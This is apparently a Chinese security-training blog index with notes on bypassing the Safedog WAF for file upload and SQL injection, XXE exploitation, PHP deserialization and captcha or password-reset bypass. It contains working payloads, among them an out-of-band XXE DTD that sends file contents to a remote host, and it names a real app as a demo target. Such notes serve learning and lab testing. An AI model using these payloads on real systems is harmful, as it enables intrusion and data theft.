<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.0.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-WAF-安全狗绕过文件上传" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/23/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time datetime="2021-12-23T07:11:21.000Z" itemprop="datePublished">2021-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/23/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">WAF-安全狗绕过文件上传</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="大多WAF-匹配原则"><a href="#大多WAF-匹配原则" class="headerlink" title="大多WAF 匹配原则"></a>大多WAF 匹配原则</h4><ol>
<li>看见上传.php文件名马上拦截</li>
<li>看见上传php.php文件名限制左边或者右边</li>
</ol>
<h4 id="上传参数"><a href="#上传参数" class="headerlink" title="上传参数"></a>上传参数</h4><p>Content-Disposition–用于接受表单数据<br>    一般可以任意修改，甚至删除<br>name–接受到的表单名<br>    不可修改<br>filename–上传文件名<br>    可以修改<br>Content-Type–MIME类型<br>    视情况定，需要考虑网站上传验证是否处理</p>
<h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><p>①%00加url编码绕过<br>原理：利用截断加编码让waf匹配不到php后缀并且我们自己可以解析为php文件<br>filename=”x.php[%00].jpg”<br>②单双引号变异绕过：<br>原理：编程语言中变量后面一般都有双引号，有时候waf没有考虑到去掉引号而存在绕过<br>filename=”2’.php<br>filename=”‘2.php</p>
<p>③双文件名绕过：<br>原理：开发waf的作者只考虑到了单个变量提交，而没考虑到我们复制一个filename，产生了循环，也就只匹配了第一个<br>filename= ;filename=”php.php”<br>④换行绕过：<br>原理：数据包的换行默认是\n，但是waf在检测的时候检测到的是x\n.\np\nh\np<br>filename=”x<br>.<br>p<br>h<br>p<br>“</p>
<p>⑤参数溢出绕过<br>原理：waf检测的范围有限，没有考虑参数溢出的情况<br>Content-Disposition: form-data;[垃圾数据]; name=”file”;[垃圾数据];filename=”x.php”</p>
<p>⑥重复参数绕过<br>原理：waf误认为提交的参数是正常的，因而不会检测后面的数据<br>filename=”Content-Disposition: form-data; name=”upload_file”;x.php”</p>
<p>⑦数据截止绕过<br>filename=”a.jpg;.php”</p>
<p>⑧fuzz绕过<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11221527.html">https://www.cnblogs.com/-mo-/p/11221527.html</a></p>
<p>其他绕过payload：<br>filename=”‘.php<br>filename=”;2.php”</p>
<h4 id="CC防护绕过"><a href="#CC防护绕过" class="headerlink" title="CC防护绕过"></a>CC防护绕过</h4><p>作用：检测数据包、检测速度<br>①未开CC绕过：模拟用户请求GET请求，比较简单，基本都有扫描防护<br>②开启CC绕过：<br>延时扫描<br>UA白名单<br>挂代理池</p>
<h4 id="AWVS漏扫工具注入测试绕过"><a href="#AWVS漏扫工具注入测试绕过" class="headerlink" title="AWVS漏扫工具注入测试绕过"></a>AWVS漏扫工具注入测试绕过</h4><p>延时扫描，爬虫白名单<br>WAF扫描工具-wafw00f</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11221527.html">https://www.cnblogs.com/-mo-/p/11221527.html</a>   文件上传fuzz字典生成脚本<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/12324425.html">https://www.cnblogs.com/-chenxs/p/12324425.html</a>   WAF绕过参考方法<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17JiEcLOmA0VX1o1f641kKw">https://pan.baidu.com/s/17JiEcLOmA0VX1o1f641kKw</a>    提取码：1111  安全狗apache4.0安装包<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cxd4321/p/14629633.html">https://www.cnblogs.com/cxd4321/p/14629633.html</a>    各大搜索引擎 User-Agent</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/12/23/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="ckxin0f5v000apovje4et4z4u" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-WAF-安全狗绕过SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2021-12-03T05:51:16.000Z" itemprop="datePublished">2021-12-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/">WAF-安全狗绕过SQL注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="WAF绕过-安全狗"><a href="#WAF绕过-安全狗" class="headerlink" title="WAF绕过-安全狗"></a>WAF绕过-安全狗</h4><p>阿里云、云盾、宝塔、安全狗</p>
<p>深信服、绿盟、天融信、奇安信等等</p>
<h4 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h4><p>1、GET方式<br>2、POST方式<br>3、http头部-爬虫白名单</p>
<h4 id="干扰字符"><a href="#干扰字符" class="headerlink" title="干扰字符"></a>干扰字符</h4><p>1、大小写<br>     进行字母大小写绕过<br>2、加密<br>     字符串加密<br>3、编码<br>     url、md5，base64等几种常见的编码方式<br>4、等价函数<br>     由于检测到关键字，因此无法使用某些函数或命令，但在很多情况下，我们可以使用它们的等效或类似代码<br>     替换mid、ascii、eval等几种常见的敏感函数，来执行同样的效果，用其他函数来取代敏感函数<br>5、特殊符号<br>     绕过正则表达式的匹配<br>     +、`、~、!、@、%、()、[]、.、-、+ 、|、%00<br>6、注释符混用    /<strong>/<br>      类似跟特殊符号的作用<br>      select database() = select database/</strong>/()<br>7、参数污染</p>
<p>#数据库注释符<br>①Oracle<br>– 单行注释<br>/<em>多行注释</em>/ </p>
<p>②MS SQL Server<br>– 单行注释<br>/<em>多行注释</em>/ </p>
<p>③MySQL<br>#单行注释<br>– 单行注释（特别注意，– 后有个空格！！！）<br>/<em>多行注释</em>/</p>
<h4 id="SQL注入绕过实验"><a href="#SQL注入绕过实验" class="headerlink" title="SQL注入绕过实验"></a>SQL注入绕过实验</h4><p>%00 空字符<br>%0a 换行符<br>%23 #</p>
<p>/* <em>/<br>/</em>!<em>/<br>/</em>!44509*/<br>/<em>!/</em>!*/</p>
<p><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>/%23a<br>select 1,2,3#</p>
<p>#payload<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union all%23%0Aselect 1,2,3#<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>/%23a%0Aselect 1,2,3#<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>/%23a%0Aselect 1,database%23a%0A(),3#<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>/%23a%0A/<em>!select 1,database%23x%0A(),3</em>/#</p>
<p><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=1/*&amp;id=-1%20union%20select%201,2,3%23*/">http://192.168.80.140/sqlilabs/Less-2/?id=1/*&amp;id=-1%20union%20select%201,2,3%23*/</a><br>参数污染：安全狗进行检测得时候，会以为后面得已经被注释了，所以不会去检测，然后由于参数污染，实际上接受得是后面得那部分&amp;后面的语句</p>
<p><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union /<em>!44509select</em>/ 1,2,3#<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>//<em>!44509select</em>/ 1,database%23x%0A(),3#</p>
<p>如果在/<em>后加惊叹号!意为/</em> <em>/里的语句将被执行，在mysql中 /</em>! ….<em>/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在/</em>!….*/中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行</p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://www.360doc.cn/mip/960801574.html?ivk_sa=1024320u">http://www.360doc.cn/mip/960801574.html?ivk_sa=1024320u</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/" data-id="ckxin0f5x000cpovjc514be19" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-XXE漏洞-利用检测绕过" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/" class="article-date">
  <time datetime="2021-11-28T15:05:08.000Z" itemprop="datePublished">2021-11-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/">XXE漏洞-利用检测绕过</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="XXE-amp-XML漏洞"><a href="#XXE-amp-XML漏洞" class="headerlink" title="XXE&amp;XML漏洞"></a>XXE&amp;XML漏洞</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
<h5 id="XML与HTML的区别"><a href="#XML与HTML的区别" class="headerlink" title="XML与HTML的区别"></a>XML与HTML的区别</h5><p>XML 被设计用来传输和存储数据，其焦点是数据的内容<br>HTML 被设计用来显示数据，其焦点是数据的外观<br>HTML旨在显示信息，而XML旨在传输信息。</p>
<h5 id="XML文档结构包括："><a href="#XML文档结构包括：" class="headerlink" title="XML文档结构包括："></a>XML文档结构包括：</h5><p>​    ①XML声明<br>​    ②DTD文档类型定义（可选）<br>​    ③文档元素</p>
<!--XML声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!--DTD，这部分可选的-->          
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
<pre><code>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</code></pre>
<p>]&gt;</p>
<!--文档元素-->                                                                          
<p><foo>&xxe;</foo></p>
<p>SYSTEM标识符意味着该实体将从外部来源获取内容</p>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>文件读取<br>RCE执行<br>内网攻击<br>Dos攻击</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>1、输出形式<br>      ①有回显：<br>    协议玩法：http、file、各个脚本支持协议<br>    外部引用<br>      ②无回显：外部引用-反向连接配合<br>2、过滤绕过<br>      ①各种协议<br>      ②外部引用<br>      ③编码UTF-16BE</p>
<h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>1、白盒：<br>     ①函数及可控变量查找<br>     ②传输和存储数据格式类型<br>2、黑盒：<br>     ①人工：<br>    数据格式类型判断： <user>test</user><pass>admin</pass><br>    Content-Type值判断：test/xml、application/xml<br>    更改Content-Type值看返回<br>     ②工具：XXEinjector、XXExploiter等</p>
<p>#DTD    —会被XML所识别并执行<br>文档类型定义（DTD）可定义合法的 XML 文档构建模块<br>它使用一系列合法的元素来定义文档的结构<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用<br>（1）内部的 DOCTYPE 声明<br><!DOCTYPE 根元素 [元素声明]><br>（2）外部文档声明<br><!DOCTYPE 根元素 SYSTEM ”文件名”><br>#DTD 实体<br>（1）内部实体声明<br><!ENTITY 实体名称 ”实体的值”><br>（2）外部实体声明<br><!ENTITY 实体名称 SYSTEM ”URI”><br>（3）参数实体声明<br><!ENTITY %实体名称 ”实体的值”><br><!ENTITY %实体名称 SYSTEM ”URI”></p>
<p>#xxe 漏洞修复与防御方案-php,java,python<br>#方案 1-禁用外部实体<br>PHP:<br>libxml_disable_entity_loader(true);<br>JAVA:<br>DocumentBuilderFactory dbf<br>=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);<br>Python：<br>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))<br>#方案 2-过滤用户提交的 XML 数据<br>过滤关键词：&lt;!DOCTYPE 和&lt;!ENTITY，或者 SYSTEM 和 PUBLIC</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>pikachu靶场XML数据传输测试–回显,玩法,协议,引入</p>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><?xml version = "1.0"?>

<!DOCTYPE ANY [
 <!ENTITY xxe SYSTEM "file:///C://www.txt">
<p>]&gt;<br><x>&xxe;</x></p>
<h5 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h5><?xml version="1.0" encoding="UTF-8"?><p> </p>
<!DOCTYPE foo [ 
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://192.168.80.160/1.txt" >
<p>]&gt;<br><foo>&xxe;</foo></p>
<h5 id="引入外部实体dtd"><a href="#引入外部实体dtd" class="headerlink" title="引入外部实体dtd"></a>引入外部实体dtd</h5><p>利用条件：网站未禁止外部实体应用<br><?xml version="1.0" ?></p>
<!DOCTYPE test [
 <!ENTITY % file SYSTEM "http://39.105.105.248/test.dtd">
<p> %file;<br>]&gt;<br><test>&send;</test></p>
<p>test.dtd:<br><!ENTITY send SYSTEM "file:///C:/www.txt"></p>
<h5 id="无回显-读取文件"><a href="#无回显-读取文件" class="headerlink" title="无回显-读取文件"></a>无回显-读取文件</h5><p>日志文件：C:\phpStudy\Apache\logs<br>需要开启日志功能：打开httpd.conf配置文件，去掉CustomLog “logs/access.log” common前面两个##<br>注：dtd里的内容，内部的%号要进行实体编码成&amp;#x25</p>
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/www.txt">
<!ENTITY % dtd SYSTEM "http://192.168.80.159/test.dtd">
<p>%dtd;%send;<br>]&gt;</p>
<p>test.dtd：<br><!ENTITY % payload 
"<!ENTITY &#x25; send SYSTEM 'http://192.168.80.159/?data=%file;'>“</p>
<blockquote>
<p>%payload;</p>
</blockquote>
<h5 id="协议-读文件-绕过"><a href="#协议-读文件-绕过" class="headerlink" title="协议-读文件(绕过)"></a>协议-读文件(绕过)</h5><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a><br><?xml version = "1.0"?></p>
<!DOCTYPE ANY 
[ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=C:/www.txt"><p> ]&gt;<br><x>&xxe;</x></p>
<pre><code>   xxelab靶场登陆框测试-检测发现</code></pre>
<p>①提交的数据包含 XML 格式如：<br><forgot><username>admin</username></forgot><br>②请求头中如：<br>Content-Type：text/xml 或 Content-type:application/xml</p>
<?xml version="1.0"?><!DOCTYPE admin [
<!ENTITY test SYSTEM "file:///C:/www.txt">
<p>]&gt;<br><user><username>&test;</username><password>admin</password></user></p>
<p> CTF-Jarvis-OJ-Web-XXE 安全真题复现-数据请求格式<br>更改请求数据格式：application/xml<br><?xml version = "1.0"?></p>
<!DOCTYPE ANY [
<!ENTITY f SYSTEM "file:///etc/passwd">
<p>]&gt;<br><x>&f;</x><br> xxe漏洞自动化注射脚本工具-XXEinjector(Ruby)</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a>     CTF-Jarvis-OJ-Web-XXE靶场<br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a>   xxe靶场<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a>  XXEinjector注入工具<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a>   XXE基本知识</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/" data-id="ckxin0f5y000epovjasuzbmpp" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PHP反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2021-11-26T11:06:00.000Z" itemprop="datePublished">2021-11-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHP反序列化漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h4><p>概念：序列化就是将对象转换成字符串，反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象<br>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。<br>serialize()        //将一个对象转换成一个字符串–序列化<br>unserialize()   //将字符串还原成一个对象–反序列化</p>
<h4 id="有类与无类"><a href="#有类与无类" class="headerlink" title="有类与无类"></a>有类与无类</h4><h5 id="1、有类-class"><a href="#1、有类-class" class="headerlink" title="1、有类  class"></a>1、有类  class</h5><p>​     触发魔术方法<br>​    __construct()<br>​    __destruct()<br>​    __wakeup()<br>​    __toString()<br>​    ……</p>
<h5 id="2、无类-不具有魔术方法"><a href="#2、无类-不具有魔术方法" class="headerlink" title="2、无类  不具有魔术方法"></a>2、无类  不具有魔术方法</h5><?php
class user{
    public $name='yucedu';
    public $age=18;
}
$a = new user();
$b = serialize($a);
echo $b;

?>

<h4 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h4><p>O:4:”user”:2:{s:3:”age”;i:18;s:4:”name”;s:3:”yucedu”;}<br>O代表对象；4代表对象名长度；2代表2个成员变量；</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>1、真实应用   java环境<br>2、各种CTF比赛</p>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1、SQL注入<br>2、代码执行<br>3、目录遍历<br>4、……</p>
<p>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a><br>__construct()//创建对象时触发<br>__destruct() //对象被销毁时触发<br>__call() //在对象上下文中调用不可访问的方法时触发<br>__callStatic() //在静态上下文中调用不可访问的方法时触发<br>__get() //用于从不可访问的属性读取数据<br>__set() //用于将数据写入不可访问的属性<br>__isset() //在不可访问的属性上调用 isset()或 empty()触发<br>__unset() //在不可访问的属性上使用 unset()时触发<br>__invoke() //当脚本尝试将对象调用为函数时触发</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p> PHP反序列化无类本地测试<br>PHP反序列化有类魔术方法本地测试<br> 网鼎杯-AreUSerialz-有类魔术方法触发<br>    =   赋值<br>    ==  判断是否相等<br>    ===  全等，类型和数值都要一样</p>
<?php
class FileHandler{
public $op=' 2';
public $filename="flag.php";//文件开头调用的是 flag.php
public $content="yucedu";
}
$flag = new FileHandler();
$flag1 = serialize($flag);
echo $flag1;
?>

<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a>   ctf网鼎杯反序列化题目<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a>    PHP反序列化基本知识</p>
<p>测试代码：<br>&lt;?php<br>error_reporting(0);<br>include “flag.php”;<br>$KEY = “yucedu”;<br>$str = $<em>GET[‘str’];<br>if (unserialize($str) ===$KEY)<br>{<br> echo “$flag”;<br>}<br>show_source(__FILE_</em>);</p>
<p>class ABC{<br> public $test;<br> function __construct(){<br> $test =1;<br> echo ‘调用了构造函数</br>‘;<br> }<br> function __destruct(){<br> echo ‘调用了析构函数</br>‘;<br> }<br> function __wakeup(){<br> echo ‘调用了苏醒函数</br>‘;<br> }<br>}<br>echo ‘创建对象 a</br>‘;<br>$a = new ABC;<br>echo ‘序列化<br>‘;<br>$a_ser=serialize($a);<br>echo ‘反序列化</br>‘;<br>$a_unser = unserialize($a_ser);<br>echo ‘GoodBye’;<br>?&gt;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckxin0f5s0005povjao8ebad0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-逻辑越权漏洞-验证码和token安全及找回机制" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" class="article-date">
  <time datetime="2021-11-21T07:59:26.000Z" itemprop="datePublished">2021-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h4><h5 id="利用形式"><a href="#利用形式" class="headerlink" title="利用形式"></a>利用形式</h5><p>1、爆破   字典暴力破解<br>2、识别<br>3、复用<br>4、回显<br>5、绕过</p>
<p>常见类型：图片，手机或邮箱，语音，操作等<br>危害：权限泄漏，短信轰炸，恶意注册，任意用户操作等</p>
<h5 id="验证码识别插件工具使用"><a href="#验证码识别插件工具使用" class="headerlink" title="验证码识别插件工具使用"></a>验证码识别插件工具使用</h5><p>Pkav_Http_Fuzz , captcha-killer、打码平台等</p>
<h4 id="token-安全"><a href="#token-安全" class="headerlink" title="token 安全"></a>token 安全</h4><p>验证中可存在绕过可继续后续测试<br>token 爆破，token客户端回显等</p>
<h5 id="利用形式-1"><a href="#利用形式-1" class="headerlink" title="利用形式"></a>利用形式</h5><p>1、爆破<br>2、本地回显</p>
<h4 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h4><p>客户端回显，Response 状态值，验证码爆破，找回流程绕过</p>
<p>客户端回显：通过抓包或者浏览器找得到验证码<br>Response状态值：修改状态值进行绕过客户端验证<br>验证码爆破：通过暴力破解<br>找回流程绕过：跳过安全验证得步骤</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p> 验证码识别插件及工具操作演示     <a target="_blank" rel="noopener" href="http://www.isaipu.net/manage/login">http://www.isaipu.net/manage/login</a><br> 验证码绕过本地演示-pikachu<br> Token回显绕过登录爆破演示-pikachu<br>手机邮箱验证码逻辑-客户端回显<br>找回密码验证码逻辑-爆破测试<br> 绑定手机验证码逻辑-状态值篡改-实例   福利期货APP演示  <a target="_blank" rel="noopener" href="https://my.pcauto.com.cn/">https://my.pcauto.com.cn/</a></p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="http://downcode.com/downcode/j_16621.shtml">http://downcode.com/downcode/j_16621.shtml</a>   PHP云人才系统3.2源码下载<br><a target="_blank" rel="noopener" href="http://www.pc6.com/az/621330.html">http://www.pc6.com/az/621330.html</a>  福利期货APP下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hy627/p/14230099.html">https://www.cnblogs.com/hy627/p/14230099.html</a>  重置密码之验证流程防绕过<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12gMVx4DK-ATTANBWpkmK0w">https://pan.baidu.com/s/12gMVx4DK-ATTANBWpkmK0w</a>  提取码:qx2c     Pkav_Http_Fuzz工具下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cwkiller/p/12659549.html">https://www.cnblogs.com/cwkiller/p/12659549.html</a>     使用burp插件captcha-killer识别图片验证码<br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2</a>    captcha-killer插件下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yufusec/p/9179625.html">https://www.cnblogs.com/yufusec/p/9179625.html</a>    Burpsuite模块—-Intruder模块详解</p>

      
    </div>
    <footer class="article-footer">
